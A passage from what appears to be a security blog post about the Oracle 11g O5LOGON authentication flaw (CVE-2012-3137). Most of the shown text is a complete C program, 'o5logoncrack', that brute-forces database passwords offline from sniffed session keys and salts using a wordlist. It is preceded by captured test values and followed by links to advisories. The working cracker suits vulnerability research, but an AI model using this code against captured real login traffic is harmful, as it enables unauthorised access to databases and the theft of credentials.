class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">11.1</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PASSWORD:            nsfocus</span></span><br><span class="line"><span class="comment">AUTH_SESSKEY:        43FD38029377C84620AE1851FC1D231409985064DEA0D0B8D48E50E6051751A5D8FDFEAAA9F83B99F37B051FA67F8546</span></span><br><span class="line"><span class="comment">AUTH_SESSKEY_CLIENT: C7248F0873F04B5A02E59178804BD361B0C77B20A4CF685460DA472996D5245745A791DFEA14399831EC62380808903C</span></span><br><span class="line"><span class="comment">AUTH_PASSWORD:       8B4C7D85F421EBA059FDBA21F5708FD4D3BB8AB2168941243B5EF07681F3B80A</span></span><br><span class="line"><span class="comment">AUTH_VFR_DATA:       3DA8A309D636ACF87004</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PASSWORD HASH:       EF92924A1DB06441457FDABC24BF89055C8594F7</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">11.2</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PASSWORD    :           nsfocus</span></span><br><span class="line"><span class="comment">AUTH_SESSKEY:           52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69</span></span><br><span class="line"><span class="comment">AUTH_SESSKEY_C          FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63</span></span><br><span class="line"><span class="comment">AUTH_PASSWORD           2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D</span></span><br><span class="line"><span class="comment">AUTH_VFR_DATA           43E0BE20B32B0BB76E57</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">PASSWORD HASH:          C3D98762D258D4BD92C572065DDEA9AF38123F88 43E0BE20B32B0BB76E57</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">11.x</span></span><br><span class="line"><span class="comment">ED91B97A04000F326F17430A65DACB30CD1EF788E6EC310742B811E32112C0C9CC39554C9C01A090CB95E95C94140C28</span></span><br><span class="line"><span class="comment">40E7B86C99F4BF1D0F17538C22EBCE054F5F677E2B521480F1F56143D047C00469A87049DE1B9CADDC8EA71392AD6E3A</span></span><br><span class="line"><span class="comment">2D4FD970C12D9618742E4525C514105E0BE24DE75C04A0C4BF6DD46BE88A339E</span></span><br><span class="line"><span class="comment">7FD52BC80AA5836695D4</span></span><br><span class="line"><span class="comment">18C314BE125DF23689215C78C33F623AABF1152E</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">-------------------------------------</span></span><br><span class="line"><span class="comment">aes key</span></span><br><span class="line"><span class="comment">0000 ef 92 92 4a 1d b0 64 41 45 7f da bc 24 bf 89 05</span></span><br><span class="line"><span class="comment">0010 5c 85 94 f7 00 00 00 00</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">decrypted_server_sesskey</span></span><br><span class="line"><span class="comment">0000 47 43 56 45 1f 61 c7 89 68 83 be ad ed c0 f4 54</span></span><br><span class="line"><span class="comment">0010 e3 dd 61 88 7e 78 d8 9a bc 8f dc 15 4f a6 2f 26</span></span><br><span class="line"><span class="comment">0020 a0 35 e2 63 68 bb 02 1b 08 08 08 08 08 08 08 08</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">encrypted_server_sesskey</span></span><br><span class="line"><span class="comment">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span></span><br><span class="line"><span class="comment">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span></span><br><span class="line"><span class="comment">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">AUTH_SESSKEY</span></span><br><span class="line"><span class="comment">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span></span><br><span class="line"><span class="comment">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span></span><br><span class="line"><span class="comment">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">----------------</span></span><br><span class="line"><span class="comment">aes key</span></span><br><span class="line"><span class="comment">0000 c3 d9 87 62 d2 58 d4 bd 92 c5 72 06 5d de a9 af</span></span><br><span class="line"><span class="comment">0010 38 12 3f 88 00 00 00 00</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">decrypted_server_sesskey</span></span><br><span class="line"><span class="comment">0000 21 64 7f ef 76 d3 ee 80 ed 24 47 50 f8 f4 f0 a6</span></span><br><span class="line"><span class="comment">0010 e4 18 a3 2a 40 0b 96 ea 5b 70 26 ab 6a e4 62 f5</span></span><br><span class="line"><span class="comment">0020 81 e0 62 1c 13 a0 21 90 08 08 08 08 08 08 08 08</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">encrypted_server_sesskey</span></span><br><span class="line"><span class="comment">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span></span><br><span class="line"><span class="comment">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span></span><br><span class="line"><span class="comment">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">AUTH_SESSKEY</span></span><br><span class="line"><span class="comment">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span></span><br><span class="line"><span class="comment">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span></span><br><span class="line"><span class="comment">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">------------------</span></span><br><span class="line"><span class="comment">aes key</span></span><br><span class="line"><span class="comment">0000 18 c3 14 be 12 5d f2 36 89 21 5c 78 c3 3f 62 3a</span></span><br><span class="line"><span class="comment">0010 ab f1 15 2e 00 00 00 00</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">decrypted_server_sesskey</span></span><br><span class="line"><span class="comment">0000 07 eb ab db ee 3a 0e b0 ab e1 9f 68 12 c1 e3 e6</span></span><br><span class="line"><span class="comment">0010 5a e9 fd 7c b9 ca ae e2 fb 21 20 d4 af 83 de 0c</span></span><br><span class="line"><span class="comment">0020 1e 12 dc 01 22 05 a0 75 08 08 08 08 08 08 08 08</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">encrypted_server_sesskey</span></span><br><span class="line"><span class="comment">0000 ed 91 b9 7a 04 00 0f 32 6f 17 43 0a 65 da cb 30</span></span><br><span class="line"><span class="comment">0010 cd 1e f7 88 e6 ec 31 07 42 b8 11 e3 21 12 c0 c9</span></span><br><span class="line"><span class="comment">0020 cc 39 55 4c 9c 01 a0 90 cb 95 e9 5c 94 14 0c 28</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">AUTH_SESSKEY</span></span><br><span class="line"><span class="comment">0000 ed 91 b9 7a 04 00 0f 32 6f 17 43 0a 65 da cb 30</span></span><br><span class="line"><span class="comment">0010 cd 1e f7 88 e6 ec 31 07 42 b8 11 e3 21 12 c0 c9</span></span><br><span class="line"><span class="comment">0020 cc 39 55 4c 9c 01 a0 90 cb 95 e9 5c 94 14 0c 28</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/aes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/md5.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/sha.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;getopt.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//*********************************************************************************************************************</span></span><br><span class="line"><span class="comment">// Hashes captured on the network during authentication phase</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned char AUTH_SESSKEY  [] = &#123;  0x43,0xFD,0x38,0x02,0x93,0x77,0xC8,0x46,0x20,0xAE,0x18,0x51,0xFC,0x1D,0x23,0x14,0x09,0x98,0x50,0x64,0xDE,0xA0,0xD0,0xB8,0xD4,0x8E,0x50,0xE6,0x05,0x17,0x51,0xA5,0xD8,0xFD,0xFE,0xAA,0xA9,0xF8,0x3B,0x99,0xF3,0x7B,0x05,0x1F,0xA6,0x7F,0x85,0x46&#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//unsigned char AUTH_SESSKEY_C[] = &#123;  0xC7,0x24,0x8F,0x08,0x73,0xF0,0x4B,0x5A,0x02,0xE5,0x91,0x78,0x80,0x4B,0xD3,0x61,0xB0,0xC7,0x7B,0x20,0xA4,0xCF,0x68,0x54,0x60,0xDA,0x47,0x29,0x96,0xD5,0x24,0x57,0x45,0xA7,0x91,0xDF,0xEA,0x14,0x39,0x98,0x31,0xEC,0x62,0x38,0x08,0x08,0x90,0x3C&#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//unsigned char AUTH_PASSWORD [] = &#123;  0x8B,0x4C,0x7D,0x85,0xF4,0x21,0xEB,0xA0,0x59,0xFD,0xBA,0x21,0xF5,0x70,0x8F,0xD4,0xD3,0xBB,0x8A,0xB2,0x16,0x89,0x41,0x24,0x3B,0x5E,0xF0,0x76,0x81,0xF3,0xB8,0x0A &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//unsigned char AUTH_VFR_DATA [] = &#123;  0x3D,0xA8,0xA3,0x09,0xD6,0x36,0xAC,0xF8,0x70,0x04 &#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned char AUTH_SESSKEY  [] = &#123; 0x52,0xFC,0x04,0xB1,0xFF,0x81,0x10,0xCA,0x12,0x63,0xDF,0x5B,0xC6,0x1A,0x7E,0x57,0x74,0x0C,0x8A,0x51,0x11,0xD2,0x2B,0x41,0xE5,0x3C,0xC1,0x67,0xFD,0xF2,0xA6,0x87,0x89,0x58,0x20,0x0D,0x9B,0x2B,0x6A,0x51,0xC9,0x5D,0x77,0x9F,0xDE,0xBA,0xBB,0x69 &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//unsigned char AUTH_SESSKEY_C[] = &#123; 0xFA,0x6D,0xCD,0x0F,0x38,0x9E,0x92,0xD1,0x8F,0x81,0x88,0xEC,0x69,0x31,0x3B,0x52,0x4F,0x42,0x11,0x84,0xFA,0xE6,0x79,0x61,0x3A,0x72,0xFC,0x8D,0xFD,0x0A,0x4C,0x7B,0xB9,0x3A,0x6A,0xCB,0x8E,0x05,0xB8,0x25,0x8A,0x02,0x0D,0x29,0x54,0xEC,0x1B,0x63 &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//unsigned char AUTH_PASSWORD [] = &#123; 0x2C,0x5F,0x95,0x7A,0x65,0x32,0xAD,0x91,0xD9,0x16,0xF4,0xE5,0xFA,0x7D,0x2F,0xDA,0x0E,0x6C,0xDF,0xFB,0xAA,0xED,0x88,0x3C,0xAF,0x4F,0x20,0x0C,0x89,0x83,0xAE,0x3D &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//unsigned char AUTH_VFR_DATA [] = &#123;  0x43,0xE0,0xBE,0x20,0xB3,0x2B,0x0B,0xB7,0x6E,0x57 &#125;;</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned char AUTH_SESSKEY  [] = &#123; 0xED,0x91,0xB9,0x7A,0x04,0x00,0x0F,0x32,0x6F,0x17,0x43,0x0A,0x65,0xDA,0xCB,0x30,0xCD,0x1E,0xF7,0x88,0xE6,0xEC,0x31,0x07,0x42,0xB8,0x11,0xE3,0x21,0x12,0xC0,0xC9,0xCC,0x39,0x55,0x4C,0x9C,0x01,0xA0,0x90,0xCB,0x95,0xE9,0x5C,0x94,0x14,0x0C,0x28 &#125;; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned char AUTH_VFR_DATA [] = &#123; 0x7F,0xD5,0x2B,0xC8,0x0A,0xA5,0x83,0x66,0x95,0xD4 &#125;; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned char AUTH_SESSKEY  [] = &#123;   0xBD,0x53,0x44,0x89,0x91,0xEE,0xAB,0x1E,0xCD,0x8D,0x32,0xFB,0x59,0x52,0x3F,0x0C,0xBD,0xB3,0x3B,0x40,0xC2,0x8F,0xEB,0xED,0xDD,0x5A,0xA3,0xA4,0xAF,0x0C,0xF6,0xB7,0x23,0x06,0x16,0x2D,0x3F,0x0C,0x1E,0x8D,0xB2,0x53,0x8A,0xF2,0x91,0xEC,0x01,0xA5&#125;;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//unsigned char AUTH_VFR_DATA [] = &#123; 0x03,0x1C,0xB4,0x72,0xC4,0xD9,0x04,0x12,0xDD,0x31 &#125;; </span></span><br><span class="line"></span><br><span class="line"><span class="comment">//*********************************************************************************************************************</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">HexStringtoBinArray</span><span class="params">(<span class="type">char</span>* str, <span class="type">unsigned</span> <span class="type">char</span>* <span class="built_in">array</span>)</span>&#123;</span><br><span class="line">    <span class="type">int</span> alen=<span class="built_in">strlen</span>(str)/<span class="number">2</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> t[<span class="number">2</span>];</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hexc;</span><br><span class="line">    <span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(;i&lt;<span class="built_in">strlen</span>(str);i=i+<span class="number">2</span>)&#123;</span><br><span class="line">        t[<span class="number">0</span>]=str[i];</span><br><span class="line">        t[<span class="number">1</span>]=str[i+<span class="number">1</span>];</span><br><span class="line">        hexc = t[<span class="number">0</span>]<span class="number">-48</span>;</span><br><span class="line">        <span class="keyword">if</span> (hexc &gt; <span class="number">9</span>) hexc-=<span class="number">7</span>;</span><br><span class="line">        <span class="built_in">array</span>[j]=hexc*<span class="number">16</span>;</span><br><span class="line">        hexc = t[<span class="number">1</span>]<span class="number">-48</span>;</span><br><span class="line">        <span class="keyword">if</span> (hexc &gt; <span class="number">9</span>) hexc-=<span class="number">7</span>;</span><br><span class="line">        <span class="built_in">array</span>[j]+=hexc;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> j;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">hexdump</span><span class="params">( FILE *f, <span class="type">const</span> <span class="type">char</span> *title, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span> *s,<span class="type">int</span> l)</span> &#123;</span><br><span class="line">    <span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(f, <span class="string">&quot;%s&quot;</span>, title);</span><br><span class="line">    <span class="keyword">for</span> (; n &lt; l; ++n) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((n % <span class="number">16</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(f, <span class="string">&quot;\n%04x&quot;</span>, n);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">fprintf</span>(f, <span class="string">&quot; %02x&quot;</span>, s[n]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fprintf</span>(f, <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ORACLE_MixCase_Hash</span> <span class="params">(<span class="type">char</span> *passwd, <span class="type">int</span> passwd_len, <span class="type">unsigned</span> <span class="type">char</span> salt[<span class="number">10</span>], <span class="type">unsigned</span> <span class="type">char</span>* oracle_mixcase_hash)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> to_hash[<span class="number">256</span>];</span><br><span class="line">    SHA_CTX ctx;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span> (to_hash, passwd, passwd_len);</span><br><span class="line">    <span class="built_in">memcpy</span> (to_hash+passwd_len, salt, <span class="number">10</span>);</span><br><span class="line"></span><br><span class="line">    SHA1_Init (&amp;ctx);</span><br><span class="line">    SHA1_Update (&amp;ctx, to_hash, passwd_len+<span class="number">10</span>);</span><br><span class="line">    SHA1_Final (oracle_mixcase_hash, &amp;ctx);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ORACLE_TNS_Decrypt_AES192_CBC</span> <span class="params">(<span class="type">unsigned</span> <span class="type">char</span> aes_key_bytes[<span class="number">24</span>], <span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">int</span> input_len, <span class="type">unsigned</span> <span class="type">char</span>* output)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iv[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    AES_KEY key;</span><br><span class="line">    AES_set_decrypt_key(aes_key_bytes, <span class="number">192</span>, &amp;key);</span><br><span class="line">    AES_cbc_encrypt(input, output, input_len, &amp;key, iv, AES_DECRYPT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">ORACLE_TNS_Encrypt_AES192_CBC</span> <span class="params">(<span class="type">unsigned</span> <span class="type">char</span> aes_key_bytes[<span class="number">24</span>], <span class="type">unsigned</span> <span class="type">char</span>* input, <span class="type">int</span> input_len, <span class="type">unsigned</span> <span class="type">char</span>* output)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> iv[] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    AES_KEY key;</span><br><span class="line">    AES_set_encrypt_key(aes_key_bytes, <span class="number">192</span>, &amp;key);</span><br><span class="line">    AES_cbc_encrypt(input, output, input_len, &amp;key, iv, AES_ENCRYPT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">usage</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;o5logoncrack -k server sesskey -s salt -d dict\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> password [<span class="number">100</span>];</span><br><span class="line">    <span class="type">char</span> aes_key_bytes[<span class="number">24</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">char</span> dict_filename[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> Oracle_MixCaseHash[<span class="number">20</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> decrypted_server_sesskey[<span class="number">48</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> encrypted_server_sesskey[<span class="number">48</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> AUTH_SESSKEY[<span class="number">48</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> AUTH_VFR_DATA[<span class="number">10</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> len;</span><br><span class="line">    <span class="type">int</span> ret;</span><br><span class="line">    <span class="type">int</span> debug = <span class="number">0</span>;</span><br><span class="line">    FILE * fp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ch;</span><br><span class="line">    <span class="type">int</span> args = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>( ( ch = getopt( argc, argv, <span class="string">&quot;k:s:d:v&quot;</span> ) ) != EOF ) &#123;</span><br><span class="line">        <span class="keyword">switch</span>(ch) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;k&#x27;</span>:</span><br><span class="line">            HexStringtoBinArray(optarg, AUTH_SESSKEY);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;s&#x27;</span>:</span><br><span class="line">            HexStringtoBinArray(optarg, AUTH_VFR_DATA);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;d&#x27;</span>:</span><br><span class="line">            <span class="built_in">strncpy</span>(dict_filename, optarg, <span class="number">255</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;v&#x27;</span>:</span><br><span class="line">            debug = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            usage();</span><br><span class="line">        &#125;</span><br><span class="line">        args++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (args &lt; <span class="number">3</span>) usage();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;*************************************************************\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;Oracle 11g TNS AES-192 cracker by zz@nsfocus\n&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;*************************************************************\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( (fp = fopen(dict_filename, <span class="string">&quot;r&quot;</span>)) == <span class="literal">NULL</span> ) &#123;</span><br><span class="line">        perror(<span class="string">&quot;fail to read&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(fgets(password, <span class="number">100</span>, fp) != <span class="literal">NULL</span>) &#123;</span><br><span class="line"></span><br><span class="line">        len = <span class="built_in">strlen</span>(password);</span><br><span class="line">        <span class="keyword">if</span> (password[len<span class="number">-1</span>] == <span class="number">0xa</span> &amp;&amp; password[len<span class="number">-2</span>] == <span class="number">0xd</span>) &#123;</span><br><span class="line">            password[len<span class="number">-2</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> password[len<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stdout</span>, <span class="string">&quot;try `%s&#x27;\n&quot;</span>, password);</span><br><span class="line">        <span class="comment">// Create Oracle Hash from the salt (AUTH_VFR_DATA) and the password</span></span><br><span class="line">        ORACLE_MixCase_Hash (password, <span class="built_in">strlen</span> (password), AUTH_VFR_DATA, Oracle_MixCaseHash);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span> (aes_key_bytes,<span class="number">0</span>,<span class="keyword">sizeof</span>(aes_key_bytes));</span><br><span class="line">        <span class="built_in">memcpy</span> (aes_key_bytes,Oracle_MixCaseHash, <span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            hexdump(<span class="built_in">stdout</span>, <span class="string">&quot;aes_key_bytes&quot;</span>, aes_key_bytes, <span class="keyword">sizeof</span>(aes_key_bytes));</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span> (decrypted_server_sesskey, <span class="number">0</span>, <span class="keyword">sizeof</span>(decrypted_server_sesskey));</span><br><span class="line">        ORACLE_TNS_Decrypt_AES192_CBC (aes_key_bytes, AUTH_SESSKEY, <span class="number">48</span>, decrypted_server_sesskey);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (debug)</span><br><span class="line">            hexdump(<span class="built_in">stdout</span>, <span class="string">&quot;decrypted_server_sesskey&quot;</span>, decrypted_server_sesskey, <span class="keyword">sizeof</span>(decrypted_server_sesskey));</span><br><span class="line"></span><br><span class="line">        ret = <span class="built_in">strncmp</span>(&amp;decrypted_server_sesskey[<span class="number">40</span>], <span class="string">&quot;\x08\x08\x08\x08\x08\x08\x08\x08&quot;</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (ret == <span class="number">0</span>) &#123; </span><br><span class="line">            <span class="built_in">printf</span> (<span class="string">&quot;\nFound password: %s \n\n&quot;</span>, password);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(password, <span class="number">0</span>, <span class="keyword">sizeof</span>(password));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul>
-<li><a target="_blank" rel="noopener" href="http://threatpost.com/en_us/blogs/flaw-oracle-logon-protocol-leads-easy-password-cracking-092012">http://threatpost.com/en_us/blogs/flaw-oracle-logon-protocol-leads-easy-password-cracking-092012</a></li>
-<li><a target="_blank" rel="noopener" href="http://www.soonerorlater.hu/index.khtml?article_id=512">http://www.soonerorlater.hu/index.khtml?article_id=512</a></li>
-<li><a target="_blank" rel="noopener" href="http://marcel.vandewaters.nl/oracle/security/cryptographic-flaws-in-oracle-database-authentication-protocol">http://marcel.vandewaters.nl/oracle/security/cryptographic-flaws-in-oracle-database-authentication-protocol</a></li>
-<li><a target="_blank" rel="noopener" href="http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-3137">http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2012-3137</a></li>
-<li><a target="_blank" rel="noopener" href="http://www.openwall.com/lists/john-users/2012/09/28/1">http://www.openwall.com/lists/john-users/2012/09/28/1</a></li>
-<li><a target="_blank" rel="noopener" href="http://marcel.vandewaters.nl/oracle/security/password-hashes">http://marcel.vandewaters.nl/oracle/security/password-hashes</a></li>
-</ul>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-  <nav class="pagination">
